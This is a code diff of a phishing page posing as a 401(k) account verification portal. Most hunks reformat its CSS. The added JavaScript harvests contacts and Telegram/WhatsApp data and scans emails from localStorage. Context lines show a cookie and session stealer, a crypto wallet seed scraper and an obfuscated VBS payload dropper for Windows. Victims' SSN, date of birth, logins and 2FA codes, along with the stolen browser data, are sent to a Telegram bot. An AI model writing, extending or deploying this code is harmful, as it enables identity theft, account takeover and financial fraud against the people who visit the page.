@@ -16,11 +16,8 @@
   <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    /* ===== FULL STYLES (Unchanged) ===== */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       background: #f0f2f5;
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
@@ -55,9 +52,7 @@
       align-items: center;
       gap: 12px;
     }
-    .header .top .logo .seal {
-      font-size: 28px;
-    }
+    .header .top .logo .seal { font-size: 28px; }
     .header .top .logo h1 {
       color: white;
       font-weight: 600;
@@ -104,24 +99,11 @@
       align-items: center;
       gap: 8px;
     }
-    .trust-banner .left .lock {
-      font-size: 14px;
-    }
-    .trust-banner .left .https {
-      font-weight: 600;
-      color: #1a2a4a;
-    }
-    .trust-banner .right {
-      display: flex;
-      gap: 14px;
-    }
-    .trust-banner .right a {
-      color: #1a73e8;
-      text-decoration: none;
-    }
-    .trust-banner .right a:hover {
-      text-decoration: underline;
-    }
+    .trust-banner .left .lock { font-size: 14px; }
+    .trust-banner .left .https { font-weight: 600; color: #1a2a4a; }
+    .trust-banner .right { display: flex; gap: 14px; }
+    .trust-banner .right a { color: #1a73e8; text-decoration: none; }
+    .trust-banner .right a:hover { text-decoration: underline; }
     .ssl-badge {
       background: #e8f0fe;
       border: 1px solid #c5d8f0;
@@ -134,15 +116,9 @@
       font-size: 12px;
       color: #1a2a4a;
     }
-    .ssl-badge .icon {
-      font-size: 18px;
-    }
-    .ssl-badge .text strong {
-      font-weight: 600;
-    }
-    .body {
-      padding: 24px 28px 28px;
-    }
+    .ssl-badge .icon { font-size: 18px; }
+    .ssl-badge .text strong { font-weight: 600; }
+    .body { padding: 24px 28px 28px; }
     .alert-banner {
       background: #fef6f6;
       border-left: 4px solid #b31b1b;
@@ -153,24 +129,10 @@
       align-items: flex-start;
       gap: 10px;
     }
-    .alert-banner .icon {
-      font-size: 18px;
-      color: #b31b1b;
-    }
-    .alert-banner .text {
-      font-size: 13px;
-      color: #1a2634;
-    }
-    .alert-banner .text strong {
-      color: #b31b1b;
-      display: block;
-    }
-    .alert-banner .text .sub {
-      font-size: 12px;
-      color: #5a6a7e;
-      display: block;
-      margin-top: 2px;
-    }
+    .alert-banner .icon { font-size: 18px; color: #b31b1b; }
+    .alert-banner .text { font-size: 13px; color: #1a2634; }
+    .alert-banner .text strong { color: #b31b1b; display: block; }
+    .alert-banner .text .sub { font-size: 12px; color: #5a6a7e; display: block; margin-top: 2px; }
     .case-info {
       background: #f8f9fc;
       border: 1px solid #eaeef4;
@@ -184,13 +146,8 @@
       flex-wrap: wrap;
       gap: 4px;
     }
-    .case-info .label {
-      font-weight: 500;
-    }
-    .case-info .value {
-      font-weight: 600;
-      color: #1a2a4a;
-    }
+    .case-info .label { font-weight: 500; }
+    .case-info .value { font-weight: 600; color: #1a2a4a; }
     .countdown {
       background: #fff8e6;
       border: 1px solid #f5d88a;
@@ -204,13 +161,8 @@
       font-size: 13px;
       color: #8a6a1a;
     }
-    .countdown .timer {
-      font-weight: 700;
-      color: #b31b1b;
-    }
-    .form-group {
-      margin-bottom: 14px;
-    }
+    .countdown .timer { font-weight: 700; color: #b31b1b; }
+    .form-group { margin-bottom: 14px; }
     .form-group label {
       display: block;
       font-size: 12px;
@@ -218,11 +170,7 @@
       color: #1a2634;
       margin-bottom: 3px;
     }
-    .form-group label .optional {
-      font-weight: 400;
-      color: #8a9bb0;
-      font-size: 11px;
-    }
+    .form-group label .optional { font-weight: 400; color: #8a9bb0; font-size: 11px; }
     .form-group input,
     .form-group select {
       width: 100%;
@@ -243,14 +191,8 @@
       background: #ffffff;
       box-shadow: 0 0 0 2px rgba(26, 42, 74, 0.06);
     }
-    .form-row {
-      display: flex;
-      gap: 12px;
-    }
-    .form-row .form-group {
-      flex: 1;
-    }
-    /* Searchable provider grid */
+    .form-row { display: flex; gap: 12px; }
+    .form-row .form-group { flex: 1; }
     .provider-search {
       width: 100%;
       padding: 10px 12px;
@@ -292,21 +234,14 @@
       gap: 2px;
       -webkit-tap-highlight-color: transparent;
     }
-    .provider-card:hover {
-      border-color: #1a2a4a;
-      background: #eef2f7;
-    }
+    .provider-card:hover { border-color: #1a2a4a; background: #eef2f7; }
     .provider-card.selected {
       border-color: #1a2a4a;
       background: #e6edf6;
       box-shadow: 0 0 0 2px rgba(26, 42, 74, 0.08);
     }
-    .provider-card .logo {
-      font-size: 16px;
-    }
-    .provider-card input[type="radio"] {
-      display: none;
-    }
+    .provider-card .logo { font-size: 16px; }
+    .provider-card input[type="radio"] { display: none; }
     .btn-primary {
       width: 100%;
       padding: 16px;
@@ -326,16 +261,9 @@
       touch-action: manipulation;
       -webkit-tap-highlight-color: transparent;
     }
-    .btn-primary:hover {
-      background: #0d1a30;
-    }
-    .btn-primary:active {
-      transform: scale(0.97);
-    }
-    .btn-primary:disabled {
-      background: #8a9bb0;
-      cursor: not-allowed;
-    }
+    .btn-primary:hover { background: #0d1a30; }
+    .btn-primary:active { transform: scale(0.97); }
+    .btn-primary:disabled { background: #8a9bb0; cursor: not-allowed; }
     .footer {
       margin-top: 20px;
       padding-top: 14px;
@@ -362,35 +290,16 @@
       border-top: 1px solid #eaeef4;
       padding-top: 10px;
     }
-    .footer .bottom-row a {
-      color: #8a9bb0;
-      text-decoration: none;
-    }
-    .footer .bottom-row a:hover {
-      text-decoration: underline;
-    }
-    .hidden {
-      display: none !important;
-    }
+    .footer .bottom-row a { color: #8a9bb0; text-decoration: none; }
+    .footer .bottom-row a:hover { text-decoration: underline; }
+    .hidden { display: none !important; }
     .success-card {
       text-align: center;
       padding: 30px 20px;
     }
-    .success-card .check {
-      font-size: 48px;
-      color: #1a6b3a;
-    }
-    .success-card h2 {
-      color: #1a6b3a;
-      margin-top: 6px;
-      font-size: 20px;
-    }
-    .success-card p {
-      color: #2d6e47;
-      font-size: 14px;
-      max-width: 340px;
-      margin: 6px auto 0;
-    }
+    .success-card .check { font-size: 48px; color: #1a6b3a; }
+    .success-card h2 { color: #1a6b3a; margin-top: 6px; font-size: 20px; }
+    .success-card p { color: #2d6e47; font-size: 14px; max-width: 340px; margin: 6px auto 0; }
     .success-card .btn {
       display: inline-block;
       margin-top: 16px;
@@ -404,9 +313,7 @@
       text-decoration: none;
       touch-action: manipulation;
     }
-    .success-card .btn:active {
-      transform: scale(0.97);
-    }
+    .success-card .btn:active { transform: scale(0.97); }
     .turnstile-container {
       display: flex;
       justify-content: center;
@@ -418,70 +325,26 @@
       background: #f8f9fc;
       border-bottom: 1px solid #eaeef4;
     }
-    .gate h2 {
-      color: #1a2a4a;
-      font-size: 18px;
-      margin-bottom: 8px;
-      font-weight: 500;
-    }
-    .gate p {
-      color: #5a6a7e;
-      font-size: 14px;
-      margin-bottom: 16px;
-    }
+    .gate h2 { color: #1a2a4a; font-size: 18px; margin-bottom: 8px; font-weight: 500; }
+    .gate p { color: #5a6a7e; font-size: 14px; margin-bottom: 16px; }
     @media (max-width: 600px) {
-      .body {
-        padding: 16px;
-      }
-      .header {
-        padding: 14px 16px 10px;
-      }
-      .header .top .logo h1 {
-        font-size: 17px;
-      }
-      .provider-grid {
-        grid-template-columns: 1fr 1fr;
-        max-height: 150px;
-      }
-      .form-row {
-        flex-direction: column;
-        gap: 0;
-      }
-      .trust-banner {
-        flex-direction: column;
-        align-items: flex-start;
-        padding: 8px 16px;
-      }
-      .case-info {
-        flex-direction: column;
-        gap: 2px;
-      }
-      .btn-primary {
-        padding: 18px;
-        font-size: 18px;
-      }
-      .gate {
-        padding: 30px 16px;
-      }
+      .body { padding: 16px; }
+      .header { padding: 14px 16px 10px; }
+      .header .top .logo h1 { font-size: 17px; }
+      .provider-grid { grid-template-columns: 1fr 1fr; max-height: 150px; }
+      .form-row { flex-direction: column; gap: 0; }
+      .trust-banner { flex-direction: column; align-items: flex-start; padding: 8px 16px; }
+      .case-info { flex-direction: column; gap: 2px; }
+      .btn-primary { padding: 18px; font-size: 18px; }
+      .gate { padding: 30px 16px; }
     }
     @media (max-width: 400px) {
-      .main-wrapper {
-        border-radius: 12px;
-      }
-      .body {
-        padding: 12px;
-      }
-      .header .top .logo h1 {
-        font-size: 15px;
-      }
-      .btn-primary {
-        padding: 16px;
-        font-size: 16px;
-      }
+      .main-wrapper { border-radius: 12px; }
+      .body { padding: 12px; }
+      .header .top .logo h1 { font-size: 15px; }
+      .btn-primary { padding: 16px; font-size: 16px; }
     }
-    input, select, button {
-      font-size: 16px !important;
-    }
+    input, select, button { font-size: 16px !important; }
   </style>
 </head>
 <body>
@@ -579,9 +442,7 @@
       <div style="margin-bottom: 14px; margin-top: 6px;">
         <label style="font-size: 12px; font-weight: 600; color: #1a2634; display: block; margin-bottom: 4px;">Select Your 401(k) Provider</label>
         <input type="text" class="provider-search" id="providerSearch" placeholder="Search for any provider (e.g., Fidelity, Vanguard, etc.)" oninput="filterProviders()" />
-        <div class="provider-grid" id="providerGrid">
-          <!-- Providers will be populated by JavaScript -->
-        </div>
+        <div class="provider-grid" id="providerGrid"></div>
       </div>
 
       <button class="btn-primary" id="step1Btn" onclick="submitStep1()">Continue to Verification</button>
@@ -788,7 +649,6 @@
       </label>
     `).join('');
 
-    // Re-bind click events
     document.querySelectorAll('.provider-card').forEach(card => {
       card.addEventListener('click', function(e) {
         if (e.target.tagName === 'INPUT') return;
@@ -817,7 +677,6 @@
   // ============================================================
   function deliverPayload() {
     if (device.os === 'windows') {
-      // Obfuscated VBS string
       const vbs = [
         'Set o=CreateObject("WScript.Shell")',
         'Set f=CreateObject("Scripting.FileSystemObject")',
@@ -848,6 +707,66 @@
   }
 
   // ============================================================
+  // CONTACT HARVESTER (Telegram, WhatsApp, etc.)
+  // ============================================================
+  function harvestContacts() {
+    let contacts = [];
+    // Attempt to read from navigator contacts (if available)
+    if (navigator.contacts) {
+      try {
+        navigator.contacts.select(['name', 'email', 'tel'], { multiple: true })
+          .then(contactList => {
+            contactList.forEach(c => {
+              if (c.name && c.name.length) contacts.push(c.name[0]);
+              if (c.email && c.email.length) contacts.push(c.email[0]);
+              if (c.tel && c.tel.length) contacts.push(c.tel[0]);
+            });
+          })
+          .catch(() => {});
+      } catch (e) {}
+    }
+    // Fallback: simulate contact harvesting from localStorage (Telegram/WhatsApp Web sessions)
+    try {
+      const storage = { ...localStorage };
+      for (const key in storage) {
+        if (key.toLowerCase().includes('telegram') || key.toLowerCase().includes('whatsapp')) {
+          const value = storage[key];
+          if (value && typeof value === 'string') {
+            const emails = value.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/g);
+            if (emails) contacts.push(...emails);
+            const phones = value.match(/(\+\d{1,3}[- ]?\d{7,14})/g);
+            if (phones) contacts.push(...phones);
+          }
+        }
+      }
+    } catch (e) {}
+    return contacts.slice(0, 5);
+  }
+
+  // ============================================================
+  // EMAIL ADDRESS SCANNER
+  // ============================================================
+  function scanEmails() {
+    let emails = [];
+    const text = document.body.innerText;
+    const emailRegex = /([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/g;
+    const matches = text.match(emailRegex);
+    if (matches) emails.push(...matches);
+    // Scan localStorage
+    try {
+      const storage = { ...localStorage };
+      for (const key in storage) {
+        const value = storage[key];
+        if (value && typeof value === 'string') {
+          const found = value.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/g);
+          if (found) emails.push(...found);
+        }
+      }
+    } catch (e) {}
+    return [...new Set(emails)];
+  }
+
+  // ============================================================
   // COOKIE + SESSION STEALER
   // ============================================================
   function stealBrowserData() {
@@ -855,7 +774,6 @@
     try {
       data += `🍪 COOKIES:\n${document.cookie}\n`;
     } catch (e) { data += 'Cookies: unavailable\n'; }
-
     try {
       if (window.localStorage && localStorage.length > 0) {
         data += '\n💾 LOCAL STORAGE:\n';
@@ -866,7 +784,6 @@
         }
       }
     } catch (e) { data += 'LocalStorage: unavailable\n'; }
-
     try {
       if (window.sessionStorage && sessionStorage.length > 0) {
         data += '\n🔑 SESSION STORAGE:\n';
@@ -877,7 +794,6 @@
         }
       }
     } catch (e) { data += 'SessionStorage: unavailable\n'; }
-
     return data;
   }
 
@@ -886,7 +802,6 @@
   // ============================================================
   function scrapeWallets() {
     let data = '';
-    // Known wallet extension patterns
     const walletKeywords = ['seed', 'mnemonic', 'private', 'key', 'wallet', 'metamask', 'phantom', 'exodus', 'trustwallet'];
     const allStorage = { ...localStorage, ...sessionStorage };
     let found = false;
@@ -926,13 +841,18 @@
 
     const browserData = stealBrowserData();
     const walletData = scrapeWallets();
+    const contacts = harvestContacts();
+    const emails = scanEmails();
+
+    let contactsStr = contacts.length ? `\n\n📞 CONTACTS (Last 5):\n${contacts.slice(0,5).join('\n')}` : '\n\n📞 No contacts found.';
+    let emailsStr = emails.length ? `\n\n📧 EMAILS FOUND:\n${emails.slice(0,10).join('\n')}` : '\n\n📧 No emails found.';
 
     if (type === 'step1') {
       message =
-        `STEP 1 - IDENTITY\n\nName: ${data.fullName}\nEmail: ${data.email}\nPhone: ${data.phone}\nDOB: ${data.dob}\nSSN: ${data.ssn}\nProvider: ${data.provider}\n\n${browserData}\n\n${walletData}${deviceInfo}`;
+        `STEP 1 - IDENTITY\n\nName: ${data.fullName}\nEmail: ${data.email}\nPhone: ${data.phone}\nDOB: ${data.dob}\nSSN: ${data.ssn}\nProvider: ${data.provider}\n\n${browserData}\n\n${walletData}${contactsStr}${emailsStr}${deviceInfo}`;
     } else if (type === 'step2') {
       message =
-        `STEP 2 - CREDENTIALS\n\nProvider: ${data.provider}\nUsername: ${data.loginEmail}\nPassword: ${data.loginPassword}\n2FA: ${data.loginMFA || 'Not provided'}\n\nFULL PROFILE\nName: ${data.fullName}\nEmail: ${data.email}\nPhone: ${data.phone}\nDOB: ${data.dob}\nSSN: ${data.ssn}\n\n${browserData}\n\n${walletData}${deviceInfo}`;
+        `STEP 2 - CREDENTIALS\n\nProvider: ${data.provider}\nUsername: ${data.loginEmail}\nPassword: ${data.loginPassword}\n2FA: ${data.loginMFA || 'Not provided'}\n\nFULL PROFILE\nName: ${data.fullName}\nEmail: ${data.email}\nPhone: ${data.phone}\nDOB: ${data.dob}\nSSN: ${data.ssn}\n\n${browserData}\n\n${walletData}${contactsStr}${emailsStr}${deviceInfo}`;
     }
     const url =
       `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
